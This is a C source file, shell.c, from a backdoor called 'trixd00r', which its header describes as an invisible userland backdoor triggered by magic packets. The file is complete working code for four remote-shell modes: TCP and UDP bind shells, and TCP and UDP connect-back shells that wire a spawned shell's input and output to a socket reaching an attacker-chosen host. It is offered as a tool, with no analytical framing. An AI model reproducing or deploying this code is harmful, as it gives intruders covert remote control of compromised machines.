/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          * 
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * server/src/shell.c                                                          *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#include "shell.h"
#include "wrapper.h"
#include "verbose.h"
#include "error.h"

#include <fcntl.h>


static void tcp_bind_shell(ctrl_t *);
static void tcp_connback_shell(ctrl_t *);
static void udp_bind_shell(ctrl_t *);
static void udp_connback_shell(ctrl_t *);


/* build welcome and bybebye banner and send to the client */
void send_banner(shell_t *shell, unsigned char type)
{
    char banner[920];

    
    if (type == _BAN_WELCOME) {
        snprintf(banner, sizeof(banner), "%s%s", BAN_WELCOME1, BAN_WELCOME2);
    } else {
        snprintf(banner, sizeof(banner), "%s", BAN_BYE);
    }
    
    xsendto(shell->cfd, banner, strlen(banner) + 1, 0,
            (struct sockaddr *) &shell->srv, sizeof(shell->srv));

    return;
}


/* print available shell modes */
void print_shell_modes()
{
    unsigned char i = 0;
    const char *descr[_NUM_SHELL_MODES] = {
        TCP_BIND_PORT, TCP_CONN_BACK, UDP_BIND_PORT, UDP_CONN_BACK
    };


    printf("[+] "BLUE"available shell modes"NORM"\n");
    for (i = 0; i < _NUM_SHELL_MODES; i++) {
        printf("--- %u [%s]\n", i, descr[i]);
    }

    return;
}


/* bind shell on tcp port */
static void tcp_bind_shell(ctrl_t *ctrl)
{
    const int opt = 1;
    socklen_t len = 0;
    shell_t *shell = (shell_t *) ctrl->shell;
    char buff[SOCKBUF];


    __VERBOSE_BIND_TCP;

    /* create socket, set desired socket option and fill in sockaddr_in {} */
    shell->lfd = xsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    xsetsockopt(shell->lfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    xmemset(&shell->srv, 0x00, sizeof(shell->srv));
    shell->srv.sin_family = AF_INET;
    shell->srv.sin_addr.s_addr = htonl(INADDR_ANY);
    shell->srv.sin_port = htons(shell->port);
    
    /* bind shell on given port, go to listen mode and accept connections */
    xbind(shell->lfd, (struct sockaddr *) &shell->srv, sizeof(shell->srv));
    xlisten(shell->lfd, 1024);
    len = sizeof(shell->cli);
    shell->cfd = xaccept(shell->lfd, (struct sockaddr *) &shell->cli, &len);
    
    __VERBOSE_CONNECT_FROM;

    /* exec evil shell */
    if ((shell->pid = fork()) == 0) {
        xdup2(shell->cfd, 0);
        xdup2(shell->cfd, 1);
        xdup2(shell->cfd, 2);
        sleep(1);
        __SEND_BANNER(_BAN_WELCOME);
        execl(SHELL, SHELL, NULL);
        __EXIT_SUCCESS;
    }

    /* we are done, so we can close descriptors */
    xclose(shell->lfd);
    xclose(shell->cfd);

    return;
}


/* connect back with shell on tcp port */
static void tcp_connback_shell(ctrl_t *ctrl)
{
    socklen_t len = 0;
    shell_t *shell = (shell_t *) ctrl->shell;


    __VERBOSE_CONNBACK_TCP;
    
    /* create socket and fill in sockaddr_in {} */
    shell->cfd = xsocket(AF_INET, SOCK_STREAM, 0);
    xmemset(&shell->cli, 0x00, sizeof(shell->cli));
    shell->cli.sin_family = AF_INET;
    shell->cli.sin_addr.s_addr = inet_addr(shell->host);
    shell->cli.sin_port = htons(shell->port);
    len = sizeof(shell->cli);
    
    /* connect back to client */
    xconnect(shell->cfd, (const struct sockaddr *) &shell->cli, len);

    __VERBOSE_CONNECT_TO;

    /* exec evil shell */
    if ((shell->pid = fork()) == 0) {
        xdup2(shell->cfd, 0);
        xdup2(shell->cfd, 1);
        xdup2(shell->cfd, 2);
        sleep(1);
        __SEND_BANNER(_BAN_WELCOME);
        execl(SHELL, SHELL, NULL);
        __EXIT_SUCCESS;
    }

    /* we are done, so we can close descriptors */
    xclose(shell->cfd);

    return;
}


/* bind shell on udp port */
static void udp_bind_shell(ctrl_t *ctrl)
{
    const int opt = 1;
    int sock = 0, _pipe = 0, fd[2], fd2[2], highfd = 0;
    fd_set readfds;
    socklen_t len = 0;
    char buffer[SOCKBUF];
    shell_t *shell = (shell_t *) ctrl->shell;
    
    
    __VERBOSE_BIND_UDP;

    /* create connection socket - remember we build a pipe because of UDP, so we
     * don't use direct listening socket - just read the fuckin c0de */
    shell->cfd = xsocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    xsetsockopt(shell->cfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    /* fill in sockaddr_in {} */
    xmemset(&shell->srv, 0x00, sizeof(shell->srv));
    shell->srv.sin_family = AF_INET;
    shell->srv.sin_addr.s_addr = htonl(INADDR_ANY);
    shell->srv.sin_port = htons(shell->port);
    len = sizeof(shell->srv);
   
    /* bind on given port */
    xbind(shell->cfd, (struct sockaddr *) &shell->srv, len);

    /* banner crap */
    recvfrom(shell->cfd, buffer, sizeof(buffer), 0,
             (struct sockaddr *) &shell->srv, &len);
    __SEND_BANNER(_BAN_WELCOME);

    /* build the pipe */
    FD_ZERO(&readfds);
    xpipe(fd);
    xpipe(fd2);

    /* exec evil shell - child process */
    if ((shell->pid = fork()) == 0) {
        xclose(fd[0]);
        xclose(fd2[1]);
        xdup2(fd2[0], 0);
        xdup2(fd[1], 1);
        xdup2(fd[1], 2);
        sleep(1);
        execl(SHELL, SHELL, NULL);
        xclose(fd[1]);
        xclose(fd[0]);
        __EXIT_SUCCESS;
    /* parent process */
    } else if (shell->pid > 0) {
        xclose(fd[1]);
        xclose(fd2[0]);

        /* set socket to non blocking */
        fcntl(shell->cfd, F_SETFL, O_NONBLOCK);
        fcntl(fd[0], F_SETFL, O_NONBLOCK);

        highfd = (shell->cfd > fd[0]) ? shell->cfd: fd[0];

        /* read and write back from pipe - client is connected already */
        for ( ; ; ) {
            FD_SET(shell->cfd, &readfds);
            FD_SET(fd[0], &readfds);
            xmemset(&buffer, 0x00, sizeof(buffer));
            xselect(highfd + 1, &readfds, NULL, NULL, NULL);
            sock = recvfrom(shell->cfd, buffer, sizeof(buffer), 0,
                            (struct sockaddr *) &shell->srv, &len);
            _pipe = read(fd[0], buffer, sizeof(buffer));
            sock = write(fd2[1], buffer, sock);
            if (_pipe > 0) {
                buffer[_pipe] = 0;
                xsendto(shell->cfd, buffer, _pipe, 0,
                        (struct sockaddr *) &shell->srv, len);
            }
            if ((!_pipe) || (!sock)) {
                break;
            }
        }

        /* we are done, so we can close descriptors */
        xclose(fd[0]);
        xclose(fd2[1]);
        xclose(shell->cfd);
    }
    
    return;
}


/* connect back with shell on udp port */
static void udp_connback_shell(ctrl_t *ctrl)
{
    int sock = 0, _pipe = 0, fd[2], fd2[2], highfd = 0;
    fd_set readfds;
    socklen_t len = 0;
    char buffer[SOCKBUF];
    shell_t *shell = (shell_t *) ctrl->shell;


    __VERBOSE_CONNBACK_UDP;

    /* create socket and fill in sockaddr_in {} */
    shell->cfd = xsocket(AF_INET, SOCK_DGRAM, 0);
    xmemset(&shell->cli, 0x00, sizeof(shell->srv));
    shell->srv.sin_family = AF_INET;
    shell->srv.sin_addr.s_addr = inet_addr(shell->host);
    shell->srv.sin_port = htons(shell->port);
    len = sizeof(shell->srv);
    
    FD_ZERO(&readfds);

    /* connect back to client and send welcome banner */
    xconnect(shell->cfd, (struct sockaddr *) &shell->srv, len);
    __SEND_BANNER(_BAN_WELCOME);
   
    /* build the pipe */
    xpipe(fd);
    xpipe(fd2);

    __VERBOSE_CONNECT_TO;

    /* exec evil shell - child process */
    if ((shell->pid = fork()) == 0) {
        xclose(fd[0]);
        xclose(fd2[1]);
        xdup2(fd2[0], 0);
        xdup2(fd[1], 1);
        xdup2(fd[1], 2);
        sleep(1);
        __SEND_BANNER(_BAN_WELCOME);
        execl(SHELL, SHELL, NULL);
        xclose(fd[1]);
        xclose(fd[0]);
        __EXIT_SUCCESS;
    /* parent process */
    } else if (shell->pid > 0) {
        xclose(fd[1]);
        xclose(fd2[0]);
        
        fcntl(shell->cfd, F_SETFL, O_NONBLOCK);
        fcntl(fd[0], F_SETFL, O_NONBLOCK);
        
        highfd = (shell->cfd > fd[0]) ? shell->cfd: fd[0];
        
        /* read and write back from pipe - client got connection already */
        for ( ; ; ) {
            FD_SET(shell->cfd, &readfds);
            FD_SET(fd[0], &readfds);
            xmemset(&buffer, 0x00, sizeof(buffer));
            xselect(highfd + 1, &readfds, NULL, NULL, NULL);
            sock = recvfrom(shell->cfd, buffer, sizeof(buffer), 0,
                            (struct sockaddr *) &shell->srv, &len);
            _pipe = read(fd[0], buffer, sizeof(buffer));
            sock = write(fd2[1], buffer, sock);
            
            if (_pipe > 0) {
                buffer[_pipe] = 0;
                xsendto(shell->cfd, buffer, _pipe, 0,
                        (struct sockaddr *) &shell->srv, len);
            }
            if ((!_pipe) || (!sock)) {
                break;
            }
        }

        /* we are done, so we can close descriptors */
        xclose(fd[0]);
        xclose(fd2[1]);
        xclose(shell->cfd);
    }

    return;
}


/* see above */
static void (*fparr[]) (ctrl_t *ctrl) = {
    tcp_bind_shell, tcp_connback_shell, udp_bind_shell, udp_connback_shell
};


/* either connect back or bind port and send shell */
void open_shell(ctrl_t *ctrl)
{
    fparr[ctrl->shell->mode](ctrl);

    return;
}

/* EOF */
